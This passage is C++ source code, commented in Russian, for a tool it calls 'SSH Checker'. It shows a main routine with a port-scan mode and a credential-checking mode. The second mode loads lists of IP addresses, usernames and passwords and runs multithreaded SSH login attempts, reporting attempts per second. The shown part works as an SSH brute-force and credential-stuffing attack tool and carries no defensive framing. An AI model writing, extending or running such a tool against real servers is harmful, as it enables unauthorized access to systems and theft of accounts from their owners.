            logger.fatal("Нет IP-адресов для сканирования. Завершение работы.");
            return 1;
        }

        std::vector<int> ports;
        if (!parse_ports(ports_str, ports, logger)) {
            logger.fatal("Ошибка при парсинге портов. Завершение работы.");
            return 1;
        }

        if (ports.empty()) {
            logger.fatal("Нет валидных портов для сканирования. Завершение работы.");
            return 1;
        }

        // Инициализация пула потоков
        ThreadPool pool(max_threads);

        // Генерация и добавление задач сканирования в пул потоков
        for(const auto &ip : ips) {
            for(const auto &port : ports) {
                pool.enqueue([ip, port, &logger]() {
                    scan_ssh_server(ip, port, logger);
                });
            }
        }

        // Завершение работы пула потоков
        done.store(true);
        pool.enqueue(nullptr); // Добавляем пустую задачу для завершения потоков

        logger.info("Режим сканирования завершен.");
        return 0;
    }

    // Режим проверки учетных данных
    // Проверка обязательных опций
    if (ips_file.empty() || usernames_file.empty() || passwords_file.empty() || ports_str.empty()) {
        std::cerr << "Необходимые параметры не указаны. Используйте -h для справки.\n";
        return 1;
    }

    // Логирование стартовой информации
    logger.info("Запуск SSH Checker");
    logger.info("Файл с IP-адресами: " + ips_file);
    logger.info("Файл с логинами: " + usernames_file);
    logger.info("Файл с паролями: " + passwords_file);
    logger.info("Порты: " + ports_str);
    logger.info("Таймаут: " + std::to_string(timeout) + " секунд");
    logger.info("Максимальное количество потоков: " + std::to_string(max_threads));
    logger.info("Методы аутентификации - Пароль и Keyboard-Interactive: Включены");

    // Чтение IP-адресов из файла асинхронно
    std::unordered_set<std::string> ips;
    if (!read_ips_async(ips_file, ips, logger)) {
        logger.fatal("Не удалось прочитать IP-адреса. Завершение работы.");
        return 1;
    }

    if (ips.empty()) {
        logger.fatal("Нет IP-адресов для проверки. Завершение работы.");
        return 1;
    }

    // Чтение логинов и паролей из файлов асинхронно
    std::unordered_set<std::string> usernames;
    std::unordered_set<std::string> passwords;
    if (!read_usernames_passwords_async(usernames_file, passwords_file, usernames, passwords, logger)) {
        logger.fatal("Не удалось прочитать логины и пароли. Завершение работы.");
        return 1;
    }

    if (usernames.empty() || passwords.empty()) {
        logger.fatal("Нет логинов или паролей для проверки. Завершение работы.");
        return 1;
    }

    // Парсинг портов из строки
    std::vector<int> ports;
    if (!parse_ports(ports_str, ports, logger)) {
        logger.fatal("Ошибка при парсинге портов. Завершение работы.");
        return 1;
    }

    if (ports.empty()) {
        logger.fatal("Нет валидных портов для проверки. Завершение работы.");
        return 1;
    }

    // Инициализация пула потоков
    ThreadPool pool(max_threads);

    // Инициализация счетчика попыток
    std::atomic<long> attempts_counter(0);

    // Время начала обработки
    auto start_time = std::chrono::steady_clock::now();

    // Запуск потока мониторинга прогресса
    std::thread monitor_thread(monitor_progress, std::ref(attempts_counter), start_time);

    // Генерация и добавление задач в пул потоков
    generate_and_enqueue_tasks(ips, usernames, passwords, ports, pool, logger, attempts_counter, start_time);

    // Ожидание завершения мониторинга
    if(monitor_thread.joinable()) {
        monitor_thread.join();
    }

    // Финальная статистика
    auto end_time = std::chrono::steady_clock::now();
    std::chrono::duration<double> total_elapsed = end_time - start_time;
    long total_attempts = attempts_counter.load();
    double average_speed = total_elapsed.count() > 0 ? total_attempts / total_elapsed.count() : 0.0;

    std::cout << "[Финальная Статистика] Обработано попыток: " << total_attempts
              << ", Средняя скорость: " << average_speed << " попыток/секунду"
              << ", Общее время: " << total_elapsed.count() << " секунд" << std::endl;

    logger.info("SSH Checker завершил работу.");
    return 0;
}
